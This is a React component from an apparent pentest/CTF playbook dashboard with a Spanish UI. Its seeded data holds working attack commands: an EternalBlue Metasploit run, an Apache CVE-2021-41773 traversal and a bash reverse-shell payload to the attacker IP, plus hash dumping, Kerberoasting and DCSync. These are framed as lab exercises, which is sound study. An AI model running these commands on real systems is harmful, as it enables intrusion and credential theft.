/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { PentestNode, NodeConnection, SavedWorkspace, NodeClass, NodeState } from '@/components/phantom/types';
import { 
  FolderHeart, Search, Plus, Play, CheckCircle2, Trash2, X, ChevronRight, 
  Sparkles, Terminal, ShieldAlert, RefreshCw, Download, Database, ShieldCheck, 
  Layers, ArrowUpRight, Copy, Check, Upload
} from 'lucide-react';

interface RepertoireDashboardProps {
  isOpen: boolean;
  onClose: () => void;
  activeNodes: PentestNode[];
  activeConnections: NodeConnection[];
  activeGlobalVars: Record<string, string>;
  target: string;
  onChangeTarget: (val: string) => void;
  attackerIp: string;
  onChangeAttackerIp: (val: string) => void;
  onLoadWorkspace: (nodes: PentestNode[], connections: NodeConnection[], globalVars: Record<string, string>, name: string) => void;
  onLogMessage: (type: 'info' | 'success' | 'error' | 'command_copied' | 'state_change' | 'ai', msg: string) => void;
}

// Beautiful initial preloaded CTFs/Pentest repertoire database
const PRESEEDED_REPERTOIRE: SavedWorkspace[] = [
  {
    id: 'rep-blue',
    name: 'TryHackMe "Blue" (EternalBlue Exploit)',
    description: 'Vulnerability assessment and automated exploitation of MS17-010 EternalBlue vulnerabilty. Gaining NT AUTHORITY\\SYSTEM and extracting SAM credential hashes.',
    category: 'TryHackMe',
    target: '10.10.12.82',
    attackerIp: '10.10.14.53',
    createdAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
    updatedAt: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000).toISOString(),
    globalVars: {
      '$TARGET': '10.10.12.82',
      '$ATTACKER_IP': '10.10.14.53',
      '$PORT': '445',
      '$LPORT': '4444'
    },
    nodes: [
      {
        id: 'rep-blue-1',
        title: 'Nmap - Vuln Check',
        description: 'Check vulnerability status of port 445 for EternalBlue (MS17-010) CVE-2017-0144.',
        type: 'discovery',
        tool: 'Nmap',
        state: 'success',
        commandTemplate: 'nmap -p 445 --script smb-vuln-ms17-010 $TARGET',
        customParams: {},
        evidenceProduced: {
          open_ports: [445],
          services: ['microsoft-ds'],
          findings: 'Target is VULNERABLE to EternalBlue MS17-010 (CVE-2017-0144).'
        },
        position: { x: 80, y: 150 },
        tags: ['scan', 'smb', 'ms17-010'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-blue-2',
        title: 'Metasploit - SMB EternalBlue',
        description: 'Configure and load MSF exploit module targeting memory corruption vulnerability on SMB v1.',
        type: 'exploitation',
        tool: 'Metasploit',
        state: 'success',
        commandTemplate: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $ATTACKER_IP; set LPORT $LPORT; run"',
        customParams: {},
        evidenceProduced: {
          findings: 'Meterpreter session 1 opened (10.10.14.53:4444 -> 10.10.12.82:49211)\nAccess level: NT AUTHORITY\\SYSTEM'
        },
        position: { x: 480, y: 150 },
        tags: ['exploit', 'metasploit', 'shell'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-blue-3',
        title: 'Mimikatz - SAM Hashdump',
        description: 'Dump operating system password security hashes from memory or SAM registry file.',
        type: 'post-exploitation',
        tool: 'Mimikatz',
        state: 'success',
        commandTemplate: 'hashdump',
        customParams: {},
        evidenceProduced: {
          credentials: [
            { username: 'Administrator', password: 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' },
            { username: 'Guest', password: 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' }
          ],
          findings: 'Captured elevated Active local accounts NTLM server hashes successfully.'
        },
        position: { x: 880, y: 150 },
        tags: ['hashes', 'creds', 'mimikatz'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'rep-blue-c1', sourceNodeId: 'rep-blue-1', targetNodeId: 'rep-blue-2', type: 'default' },
      { id: 'rep-blue-c2', sourceNodeId: 'rep-blue-2', targetNodeId: 'rep-blue-3', type: 'credential_flow' }
    ]
  },
  {
    id: 'rep-blogger',
    name: 'HackTheBox "Blogger" (WordPress Audit)',
    description: 'Active scanning and technological identification of blogger.pg web system, weaponizing a vulnerable third-party WordPress plugin for Initial Shell Entry.',
    category: 'HackTheBox',
    target: '10.10.53.217',
    attackerIp: '10.10.14.53',
    createdAt: new Date(Date.now() - 4 * 24 * 60 * 60 * 1000).toISOString(),
    updatedAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
    globalVars: {
      '$TARGET': '10.10.53.217',
      '$ATTACKER_IP': '10.10.14.53',
      '$PORT': '80'
    },
    nodes: [
      {
        id: 'rep-blog-1',
        title: 'Nmap - Port Sweeper',
        description: 'Initial service assessment to identify open service vectors.',
        type: 'discovery',
        tool: 'Nmap',
        state: 'success',
        commandTemplate: 'nmap -p- --min-rate 5200 $TARGET -sV',
        customParams: {},
        evidenceProduced: {
          open_ports: [80],
          services: ['http'],
          findings: 'Port 80/tcp is open. Running Apache Server v2.4.41'
        },
        position: { x: 80, y: 150 },
        tags: ['nmap', 'discovery'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-blog-2',
        title: 'FFUF - Directory Crawling',
        description: 'Audit directory roots to discover blogs, APIs or staging endpoints.',
        type: 'web',
        tool: 'FFUF',
        state: 'success',
        commandTemplate: 'ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt',
        customParams: {},
        evidenceProduced: {
          extracted_urls: ['http://$TARGET/blog/'],
          findings: 'Redirects to WordPress hosting directory path: /blog/ (301)'
        },
        position: { x: 420, y: 100 },
        tags: ['ffuf', 'web-survey'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-blog-3',
        title: 'WPScan - Vulnerable Plugins',
        description: 'Enumerate WordPress system looking for theme and vulnerable plugin components.',
        type: 'web',
        tool: 'WPScan',
        state: 'success',
        commandTemplate: 'wpscan --url http://$TARGET/blog -e ap --plugins-detection passive',
        customParams: {},
        evidenceProduced: {
          findings: 'Found vulnerable active plugin: wp-file-manager v6.0 (Vulnerable to Arbitrary File Upload RCE)'
        },
        position: { x: 760, y: 100 },
        tags: ['wordpress', 'vuln-scan'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-blog-4',
        title: 'Python - Arbitrary Upload RCE',
        description: 'Weaponize CVE-2020-25213 Arbitrary File Upload via wp-file-manager and trigger callback shell.',
        type: 'exploitation',
        tool: 'Python3',
        state: 'success',
        commandTemplate: 'python3 wp_exploit.py --target $TARGET/blog --attacker-ip $ATTACKER_IP --command "su vagrant"',
        customParams: {},
        evidenceProduced: {
          findings: 'Secured reverse terminal access as local system user: vagrant'
        },
        position: { x: 1100, y: 150 },
        tags: ['exploit', 'rce', 'python'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'rep-blog-c1', sourceNodeId: 'rep-blog-1', targetNodeId: 'rep-blog-2', type: 'default' },
      { id: 'rep-blog-c2', sourceNodeId: 'rep-blog-2', targetNodeId: 'rep-blog-3', type: 'default' },
      { id: 'rep-blog-c3', sourceNodeId: 'rep-blog-3', targetNodeId: 'rep-blog-4', type: 'default' }
    ]
  },
  {
    id: 'rep-apache',
    name: 'Apache HTTP traversal (CVE-2021-41773)',
    description: 'Scanning and exploitation of directory traversal and Remote Code Execution vulnerability in Apache HTTP Server v2.4.49.',
    category: 'VulnHub',
    target: '10.129.184.22',
    attackerIp: '10.10.14.8',
    createdAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    updatedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString(),
    globalVars: {
      '$TARGET': '10.129.184.22',
      '$ATTACKER_IP': '10.10.14.8',
      '$PORT': '80',
      '$LPORT': '5555'
    },
    nodes: [
      {
        id: 'rep-apache-1',
        title: 'Nmap Scan - Version Discovery',
        description: 'Checking Apache server precise version number.',
        type: 'discovery',
        tool: 'Nmap',
        state: 'success',
        commandTemplate: 'nmap -sV -p 80 $TARGET',
        customParams: {},
        evidenceProduced: {
          open_ports: [80],
          services: ['http'],
          findings: 'Identified Open Service: Apache httpd 2.4.49 (known vulnerable to Path Traversal)'
        },
        position: { x: 80, y: 150 },
        tags: ['recon', 'portscan'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-apache-2',
        title: 'Curl - Traversal File Inclusion',
        description: 'Verify traversal CVE-2021-41773 using cgi-bin directory to read the unix /etc/passwd path.',
        type: 'web',
        tool: 'Curl',
        state: 'success',
        commandTemplate: 'curl --data "A=A" http://$TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd',
        customParams: {},
        evidenceProduced: {
          findings: 'Vulnerability Confirmed. Traversal allowed reading passwd:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin'
        },
        position: { x: 450, y: 150 },
        tags: ['traversal', 'curl'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-apache-3',
        title: 'Curl - RCE exploit payload',
        description: 'Exploit TRAVERSAL with shell execution payload calling standard netcat to send reverse shell to attacker port.',
        type: 'exploitation',
        tool: 'Curl',
        state: 'success',
        commandTemplate: 'curl --data "echo; bash -c \'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1\'" http://$TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh',
        customParams: {},
        evidenceProduced: {
          findings: 'Exploitation finished. Secured terminal session on port 5555 successfully.'
        },
        position: { x: 820, y: 150 },
        tags: ['exploit', 'rce'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'rep-apache-c1', sourceNodeId: 'rep-apache-1', targetNodeId: 'rep-apache-2', type: 'default' },
      { id: 'rep-apache-c2', sourceNodeId: 'rep-apache-2', targetNodeId: 'rep-apache-3', type: 'default' }
    ]
  },
  {
    id: 'rep-active-forest',
    name: 'Active Directory Corporate Infiltration',
    description: 'An advanced multi-stage network assessment of the internal forest LAB-AD.CORP. Simulated lateral movement using Kerberoasting, Bloodhound, and DCShadow routing.',
    category: 'Real Pentest',
    target: 'ad-coordinator.corp.local',
    attackerIp: '192.168.10.42',
    createdAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
    updatedAt: new Date(Date.now() - 8 * 24 * 60 * 60 * 1000).toISOString(),
    globalVars: {
      '$TARGET': 'ad-coordinator.corp.local',
      '$ATTACKER_IP': '192.168.10.42',
      '$DOMAIN': 'corp.local',
      '$USER': 'svc_print_spool',
      '$PASSWORD': 'Sp00lerAdm1n'
    },
    nodes: [
      {
        id: 'rep-forest-1',
        title: 'BloodHound - Active Enumeration',
        description: 'Run SharpHound collectors from compromised workstation to pull group structures and relationships.',
        type: 'discovery',
        tool: 'SharpHound',
        state: 'success',
        commandTemplate: 'sharphound.exe -c All --domain $DOMAIN --dc-ip $TARGET',
        customParams: {},
        evidenceProduced: {
          findings: 'Collected AD dataset. Bloodhound paths show svc_print_spool user has GenericWrite access over user ADMIN_TIER1'
        },
        position: { x: 80, y: 150 },
        tags: ['ad', 'enum', 'bloodhound'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-forest-2',
        title: 'GetUserSPNs - Kerberoasting audit',
        description: 'Query Service Principal Names to request Kerberos TGS tickets, saving them offline for hash cracking.',
        type: 'ad',
        tool: 'GetUserSPNs',
        state: 'success',
        commandTemplate: 'GetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request',
        customParams: {},
        evidenceProduced: {
          findings: 'Extracted ticket for service account SQLAdmin@corp.local.\nHash signature extracted: $krb5tgs$23$*SQLAdmin...'
        },
        position: { x: 480, y: 150 },
        tags: ['krbroast', 'ad', 'creds'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'rep-forest-3',
        title: 'Mimikatz - DCSync domain hijack',
        description: 'Abuse domain replication privileges to fetch the Active Directory Administrator krbtgt password hash.',
        type: 'exploitation',
        tool: 'Mimikatz',
        state: 'success',
        commandTemplate: 'lsadump::dcsync /domain:$DOMAIN /user:krbtgt',
        customParams: {},
        evidenceProduced: {
          credentials: [
            { username: 'krbtgt', hash: '5aa22dfeb60bde8e09f5370d0bf93c9d' }
          ],
          findings: 'Successfully harvested Domain controller replication NTLM hash for KRBTGT account.'
        },
        position: { x: 880, y: 150 },
        tags: ['dcsync', 'privilege', 'ad'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'rep-forest-c1', sourceNodeId: 'rep-forest-1', targetNodeId: 'rep-forest-2', type: 'default' },
      { id: 'rep-forest-c2', sourceNodeId: 'rep-forest-2', targetNodeId: 'rep-forest-3', type: 'pivoting' }
    ]
  }
];

export default function RepertoireDashboard({
  isOpen,
  onClose,
  activeNodes,
  activeConnections,
  activeGlobalVars,
  target,
  onChangeTarget,
  attackerIp,
  onChangeAttackerIp,
  onLoadWorkspace,
  onLogMessage
}: RepertoireDashboardProps) {

  // Workspaces state (loaded from local forage / localStorage or seeded defaults)
  const [workspaces, setWorkspaces] = useState<SavedWorkspace[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeTab, setActiveTab] = useState<'HTB' | 'THM' | 'VulnHub' | 'AD' | 'All'>('All');
  
  // Create Save-as state variables
  const [saveName, setSaveName] = useState('');
  const [saveDesc, setSaveDesc] = useState('');
  const [saveCategory, setSaveCategory] = useState<'HackTheBox' | 'TryHackMe' | 'VulnHub' | 'Real Pentest' | 'Personal Writeup'>('Personal Writeup');

  // Fork / "Guardar Como" states
  const [showForkModal, setShowForkModal] = useState(false);
  const [forkName, setForkName] = useState('');
  const [forkDesc, setForkDesc] = useState('');
  const [forkCategory, setForkCategory] = useState<'HackTheBox' | 'TryHackMe' | 'VulnHub' | 'Real Pentest' | 'Personal Writeup'>('Personal Writeup');

  const handleTriggerForkMode = () => {
    if (!selectedWorkspace) return;
    setForkName(`${selectedWorkspace.name} - Copia`);
    setForkDesc(selectedWorkspace.description || '');
    setForkCategory((selectedWorkspace.category as any) || 'Personal Writeup');
    setShowForkModal(true);
  };

  const handleConfirmFork = () => {
    if (!selectedWorkspace) return;
    if (!forkName.trim()) {
      alert('Por favor introduce un nombre válido para la copia del Playbook.');
      return;
    }

    const duplicatedWorkspace: any = {
      ...JSON.parse(JSON.stringify(selectedWorkspace)),
      id: `saved-fork-${Date.now()}`,
      name: forkName.trim(),
      description: forkDesc.trim() || 'Playbook guardado como copia independiente.',
      category: forkCategory,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    const updated = [duplicatedWorkspace, ...workspaces];
    saveToDisk(updated);
    setSelectedId(duplicatedWorkspace.id);
    setShowForkModal(false);
    onLogMessage('success', `PLAYBOOK CLONADO: Guardado correctamente como un nuevo registro independiente "${duplicatedWorkspace.name}".`);
  };

  // Interactive Live Replication Simulator states
  const [replaying, setReplaying] = useState(false);
  const [replayNodeStates, setReplayNodeStates] = useState<Record<string, NodeState>>({});
  const [simLogs, setSimLogs] = useState<string[]>([]);
  const [copiedNodeId, setCopiedNodeId] = useState<string | null>(null);

  // Initialize and synchronize live between components
  useEffect(() => {
    const loadFromDisk = () => {
      const savedRep = localStorage.getItem('kronos_saved_repertoire_db');
      if (savedRep) {
        try {
          const parsed = JSON.parse(savedRep);
          if (Array.isArray(parsed) && parsed.length > 0) {
            setWorkspaces(parsed);
            return;
          }
        } catch (err) {
          console.error('Failed to parse saved repertoire, falling back to preseeded', err);
        }
      }
      
      // Seed database and save
      setWorkspaces(PRESEEDED_REPERTOIRE);
      localStorage.setItem('kronos_saved_repertoire_db', JSON.stringify(PRESEEDED_REPERTOIRE));
    };

    loadFromDisk();

    const handleSync = () => {
      loadFromDisk();
    };

    window.addEventListener('kronos-db-updated', handleSync);
    return () => {
      window.removeEventListener('kronos-db-updated', handleSync);
    };
  }, []);

  // Always keep a valid selectedId when workspaces change or load
  useEffect(() => {
    if (workspaces.length > 0) {
      if (!selectedId || !workspaces.find(w => w.id === selectedId)) {
        setSelectedId(workspaces[0].id);
      }
    } else {
      setSelectedId(null);
    }
  }, [workspaces, selectedId]);

  // Sync back state with custom event dispatching
  const saveToDisk = (updated: SavedWorkspace[], bypassDispatch = false) => {
    setWorkspaces(updated);
    localStorage.setItem('kronos_saved_repertoire_db', JSON.stringify(updated));
    if (!bypassDispatch) {
      window.dispatchEvent(new CustomEvent('kronos-db-updated'));
    }
  };

  // Full-System Backup & Migration handlers
  const handleExportFullSystemBackup = () => {
    try {
      const savedRep = localStorage.getItem('kronos_saved_repertoire_db');
      let savedRepertoireList = workspaces;
      if (savedRep) {
        try { savedRepertoireList = JSON.parse(savedRep); } catch (e) {}
      }

      const fullBackup = {
        backupIdentifier: "KRONOS_FULL_SYSTEM_BACKUP",
        version: 1,
        exportedAt: new Date().toISOString(),
        activeState: {
          globalVars: activeGlobalVars,
          nodes: activeNodes,
          connections: activeConnections
        },
        savedRepertoire: savedRepertoireList
      };

      const blob = new Blob([JSON.stringify(fullBackup, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `kronos_db_migration_${Date.now()}.json`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(url);

      onLogMessage('success', '✅ Base de datos completa exportada para migración. Todos los playbooks de laboratorio y el espacio de trabajo actual han sido respaldados.');
    } catch (e: any) {
      onLogMessage('error', `Error al exportar base de datos completa: ${e.message}`);
    }
  };

  const handleImportFullSystemBackup = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const text = event.target?.result as string;
        const backup = JSON.parse(text);

        if (!backup || typeof backup !== 'object') {
          throw new Error('El archivo no posee un formato de objeto JSON legible.');
        }

        let importedWorkspaces: SavedWorkspace[] = [];
        let importedActiveNodeList: PentestNode[] | null = null;
        let importedActiveConnList: NodeConnection[] | null = null;
        let importedActiveVars: Record<string, string> | null = null;

        if (backup.backupIdentifier === "KRONOS_FULL_SYSTEM_BACKUP" || backup.savedRepertoire) {
          // Full migration format
          if (Array.isArray(backup.savedRepertoire)) {
            importedWorkspaces = backup.savedRepertoire;
          }
          if (backup.activeState) {
            importedActiveNodeList = backup.activeState.nodes;
            importedActiveConnList = backup.activeState.connections;
            importedActiveVars = backup.activeState.globalVars;
          }
        } else if (Array.isArray(backup)) {
          // Just workspaces list
          importedWorkspaces = backup;
        } else if (backup.nodes && backup.connections) {
          // Just workflow state
          importedActiveNodeList = backup.nodes;
          importedActiveConnList = backup.connections;
          importedActiveVars = backup.globalVars || {};
        } else {
          throw new Error('Estructura de respaldo no reconciliable. Asegúrese de suministrar un archivo válido generado por el sistema.');
        }

        // 1. Sync catalog DB
        if (importedWorkspaces.length > 0) {
          saveToDisk(importedWorkspaces);
          if (importedWorkspaces[0]?.id) {
            setSelectedId(importedWorkspaces[0].id);
          }
        }

        // 2. Sync main active workbench
        if (importedActiveNodeList && importedActiveConnList && importedActiveVars) {
          onLoadWorkspace(importedActiveNodeList, importedActiveConnList, importedActiveVars, 'Respaldado (Carga Completa)');
        }

        onLogMessage('success', `📂 ¡Migración Completada! Importados ${importedWorkspaces.length} laboratorios e instalados en el catálogo local.`);
        alert(`¡Base de datos importada con éxito!\n- Catálogo de laboratorios: Reconocidos ${importedWorkspaces.length} entornos.\n- Sincronización del workspace: Aplicada.`);
        
        // Let other components know database changed
        window.dispatchEvent(new CustomEvent('kronos-db-updated'));
      } catch (err: any) {
        onLogMessage('error', `Error en migración: ${err.message}`);
        alert(`Error al importar el archivo: ${err.message}`);
      }
    };
    reader.readAsText(file);
    e.target.value = ''; // Reset input selection
  };

  const selectedWorkspace = workspaces.find(w => w.id === selectedId);

  // Handle saving current active workspace setup
  const handleSaveActiveWorkspace = () => {
    if (!saveName.trim()) {
      alert('Por favor introduce un nombre para el registro de Pentest');
      return;
    }

    const newWorkspace: SavedWorkspace = {
      id: `saved-${Date.now()}`,
      name: saveName.trim(),
      description: saveDesc.trim() || 'Pentest guardado desde el espacio de trabajo activo.',
      category: saveCategory,
      target: activeGlobalVars['$TARGET'] || '10.10.10.1',
      attackerIp: activeGlobalVars['$ATTACKER_IP'] || '10.10.14.2',
      globalVars: { ...activeGlobalVars },
      nodes: [...activeNodes],
      connections: [...activeConnections],
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    const updated = [newWorkspace, ...workspaces];
    saveToDisk(updated);
    setSelectedId(newWorkspace.id);
    
    // Reset inputs
    setSaveName('');
    setSaveDesc('');
    
    onLogMessage('success', `REPOSITORIO DE ATAQUE GUARDADO: "${newWorkspace.name}" añadido al archivador correctamente.`);
  };

  // Delete saved entry
  const handleDeleteWorkspace = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    
    const targetWorkspace = workspaces.find(w => w.id === id);
    if (!targetWorkspace) return;
    
    const confirmText = `¿Estás seguro de que deseas eliminar el playbook "${targetWorkspace.name}" de tu repertorio?`;
    if (!window.confirm(confirmText)) return;

    const updated = workspaces.filter(w => w.id !== id);
    saveToDisk(updated);
    
    if (selectedId === id) {
      setSelectedId(updated.length > 0 ? updated[0].id : null);
    }
    onLogMessage('error', `REGISTRO BORRADO: "${targetWorkspace.name}" ha sido eliminado del fichero de repertorios.`);
  };

  // Load select into primary workspace
  const handleLoadToWorkspace = () => {
    if (!selectedWorkspace) return;
    
    onLoadWorkspace(
      selectedWorkspace.nodes,
      selectedWorkspace.connections,
      selectedWorkspace.globalVars,
      selectedWorkspace.name
    );
    
    onClose();
  };

  // Live Simulated Attack Step Sequential Replicator
  const handleStartSimulatedReplay = async () => {
    if (!selectedWorkspace || selectedWorkspace.nodes.length === 0) return;
    
    setReplaying(true);
    setSimLogs([]);
    
    const initialStates: Record<string, NodeState> = {};
    selectedWorkspace.nodes.forEach(n => {
      initialStates[n.id] = 'pending';
    });
    setReplayNodeStates(initialStates);

    const logs: string[] = [];
    const pushLog = (msg: string) => {
      const formatted = `[${new Date().toLocaleTimeString()}] ${msg}`;
      logs.push(formatted);
      setSimLogs([...logs]);
    };

    const currentTarget = target || selectedWorkspace.target;
    const currentAttackerIp = attackerIp || selectedWorkspace.attackerIp;
    pushLog(`⚔️ Instando Replication Suite para: "${selectedWorkspace.name}"`);
    pushLog(`⚙️ Parámetros Objetivo: TARGET=${currentTarget}, ATTACKER_IP=${currentAttackerIp}`);
    pushLog(`🔗 Mapeando secuencia de ataque con ${selectedWorkspace.nodes.length} nodos activos...`);

    for (let i = 0; i < selectedWorkspace.nodes.length; i++) {
      const node = selectedWorkspace.nodes[i];
      
      // Interpolate parameters dynamically with unified global overrides
      let command = node.commandTemplate;
      const mergedVars = {
        ...selectedWorkspace.globalVars,
        ...activeGlobalVars,
        '$TARGET': target,
        '$ATTACKER_IP': attackerIp
      };
      Object.entries(mergedVars).forEach(([k, v]) => {
        command = command.replaceAll(k, v);
      });

      // Step starts
      setReplayNodeStates(prev => ({ ...prev, [node.id]: 'running' }));
      pushLog(`⚡ Ejecutando Nodo de Ataque ${i + 1}/${selectedWorkspace.nodes.length}: [${node.tool}] "${node.title}"`);
      pushLog(`👉 Payload: "${command}"`);
      
      // Artificial delay to simulate terminal processes
      await new Promise(resolve => setTimeout(resolve, 1800));

      // Retrieve evidence and simulate success/failure
      setReplayNodeStates(prev => ({ ...prev, [node.id]: 'success' }));
      pushLog(`✔️ Nodo Completado con éxito!`);
      
      if (node.evidenceProduced.findings) {
        pushLog(`🔍 Hallazgos: ${node.evidenceProduced.findings.split('\n')[0]}`);
      }
      if (node.evidenceProduced.credentials && node.evidenceProduced.credentials.length > 0) {
        node.evidenceProduced.credentials.forEach(c => {
          pushLog(`🔑 Credencial Capturada: [${c.username}] ➜ ${c.password || c.hash || 'Secured'}`);
        });
      }

      await new Promise(resolve => setTimeout(resolve, 800));
    }

    pushLog(`🎉 REPLICACIÓN COMPLETADA SATISFACTORIAMENTE. Objetivo comprometido al 100%.`);
    setReplaying(false);
    onLogMessage('success', `Live simulation of "${selectedWorkspace.name}" succeeded. Mapped all output successfully.`);
  };

  // Reset demo defaults db
  const handleResetDefaults = () => {
    if (window.confirm('¿Deseas restaurar la base de datos de playbooks predeterminados? Se perderán las modificaciones personalizadas.')) {
      saveToDisk(PRESEEDED_REPERTOIRE);
      setSelectedId(PRESEEDED_REPERTOIRE[0].id);
      onLogMessage('success', 'Base de datos del repertorio restaurada a su estado original.');
    }
  };

  // Filter listings
  const filteredWorkspaces = workspaces.filter(w => {
    const matchesSearch = w.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          w.description.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          w.target.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          w.category.toLowerCase().includes(searchQuery.toLowerCase());
    
    if (activeTab === 'All') return matchesSearch;
    if (activeTab === 'HTB') return matchesSearch && w.category === 'HackTheBox';
    if (activeTab === 'THM') return matchesSearch && w.category === 'TryHackMe';
    if (activeTab === 'VulnHub') return matchesSearch && w.category === 'VulnHub';
    if (activeTab === 'AD') return matchesSearch && w.category === 'Real Pentest';
    return matchesSearch;
  });

  // Calculate stats
  const totalPlaybooks = workspaces.length;
  const totalNodesMapped = workspaces.reduce((acc, w) => acc + w.nodes.length, 0);
  const totalCredentialSets = workspaces.reduce((acc, w) => {
    const credCount = w.nodes.reduce((s, n) => s + (n.evidenceProduced.credentials?.length || 0), 0);
    return acc + credCount;
  }, 0);

  if (!isOpen) return null;

  return (
    <div className="fixed top-14 left-0 right-0 bottom-0 bg-[#06070a]/85 backdrop-blur-sm z-40 flex items-center justify-center p-4">
      
      {/* Dashboard frame */}
      <div className="bg-[#0c0d12] border border-white/10 w-full max-w-6xl h-full max-h-[calc(100vh-6rem)] rounded-xl flex flex-col overflow-hidden shadow-2xl relative">
        
        {/* Banner header */}
        <div className="bg-[#0F1116] border-b border-white/10 p-4 shrink-0 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="h-9 w-9 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
              <FolderHeart className="h-5 w-5 text-emerald-400" />
            </div>
            <div>
              <h1 className="text-sm font-bold text-slate-100 tracking-wider font-mono">REPERTORIO Y ARCHIVADOR DE PENTEST / CTFs</h1>
              <p className="text-[10px] text-emerald-400 font-mono">Replicación, Simulación, Almacén y Control de Vectores Ofensivos Activos</p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            <button
              onClick={handleExportFullSystemBackup}
              className="px-3 py-1.5 bg-emerald-600/10 border border-emerald-500/35 hover:bg-emerald-600/20 text-emerald-400 text-[10px] font-mono rounded cursor-pointer flex items-center space-x-1 font-semibold"
              title="Exportar base de datos completa de sistemas y playbooks para migración"
            >
              <Download className="h-3 w-3" />
              <span>Exportar DB</span>
            </button>
            <label
              className="px-3 py-1.5 bg-purple-600/10 border border-purple-500/35 hover:bg-purple-600/20 text-purple-400 text-[10px] font-mono rounded cursor-pointer flex items-center space-x-1 font-semibold text-center"
              title="Importar archivo de migración completa"
            >
              <Upload className="h-3 w-3" />
              <span>Importar DB</span>
              <input
                type="file"
                accept=".json"
                onChange={handleImportFullSystemBackup}
                className="hidden"
              />
            </label>
            <button
              onClick={handleResetDefaults}
              className="px-3 py-1.5 bg-white/5 border border-white/10 hover:bg-white/10 text-slate-350 text-[10px] font-mono rounded cursor-pointer flex items-center space-x-1"
              title="Restaurar base de datos inicial"
            >
              <RefreshCw className="h-3 w-3" />
              <span>Reset Defaults</span>
            </button>
            <button
              onClick={onClose}
              className="p-1.5 bg-neutral-900 border border-white/10 hover:border-white/20 text-slate-400 hover:text-slate-200 rounded-lg cursor-pointer transition"
              title="Cerrar Repertorio"
            >
              <X className="h-4.5 w-4.5" />
            </button>
          </div>
        </div>

        {/* Dashboard quick stats metrics banner */}
        <div className="grid grid-cols-4 border-b border-white/5 bg-[#14161f]/35 p-3 text-xs shrink-0 select-none">
          <div className="border-r border-white/5 px-4 flex items-center space-x-3">
            <Database className="h-4 w-4 text-emerald-400" />
            <div>
              <div className="text-[10px] text-slate-500 font-mono">PENTEST/CTF GUARDADOS</div>
              <div className="font-bold font-mono text-slate-200">{totalPlaybooks} Máquinas</div>
            </div>
          </div>
          
          <div className="border-r border-white/5 px-4 flex items-center space-x-3">
            <Layers className="h-4 w-4 text-blue-400" />
            <div>
              <div className="text-[10px] text-slate-500 font-mono">NODOS DE ATAQUE REGISTRADOS</div>
              <div className="font-bold font-mono text-slate-200">{totalNodesMapped} Comandos</div>
            </div>
          </div>

          <div className="border-r border-white/5 px-4 flex items-center space-x-3">
            <ShieldCheck className="h-4 w-4 text-pink-400" />
            <div>
              <div className="text-[10px] text-slate-500 font-mono">CREDENCIALES COSECHADAS</div>
              <div className="font-bold font-mono text-slate-200">{totalCredentialSets} Logins SAM</div>
            </div>
          </div>

          <div className="px-4 flex items-center space-x-3">
            <Sparkles className="h-4 w-4 text-purple-400 animate-pulse" />
            <div>
              <div className="text-[10px] text-slate-500 font-mono">WORKSPACE ACTIVO</div>
              <div className="font-bold font-mono text-slate-200">{activeNodes.length} Nodos ({activeNodes.filter(n => n.state === 'success').length} Pwnd)</div>
            </div>
          </div>
        </div>

        {/* Central columns panel */}
        <div className="flex-1 flex overflow-hidden min-h-0">
          
          {/* LEFT COLUMN: Playbooks catalog selector */}
          <div className="w-80 border-r border-white/15 flex flex-col bg-[#0A0B0E] divide-y divide-white/5">
            
            {/* Search filter bar */}
